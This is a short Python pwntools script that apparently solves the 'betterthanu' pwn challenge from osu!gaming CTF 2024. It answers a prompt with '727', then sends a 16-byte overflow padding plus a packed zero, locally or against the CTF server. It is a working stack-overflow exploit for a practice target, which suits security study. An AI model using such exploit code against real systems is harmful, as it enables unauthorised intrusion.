#!/usr/bin/env python3
import sys, os
from pwn import *

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-writeups/osu!gaming CTF 2024/pwn/betterthanu/challenge')
elf = ELF(TARGET)

def attach(r):
    if REMOTE:
        return

    bkps = []
    cmds = []

    gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))

def exploit(r):
    attach(r)
    # r.sendlineafter(b'> ', b'HelloPwn' )
    r.sendlineafter(b'How much pp did you get? ', b'727')
    r.sendlineafter(b'Any last words?\n', b'A' * 0x10 + p64(0))
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('chal.osugaming.lol', 7279)
    else:
        REMOTE = False
        r = process([TARGET,])
    exploit(r)
    exit(0)
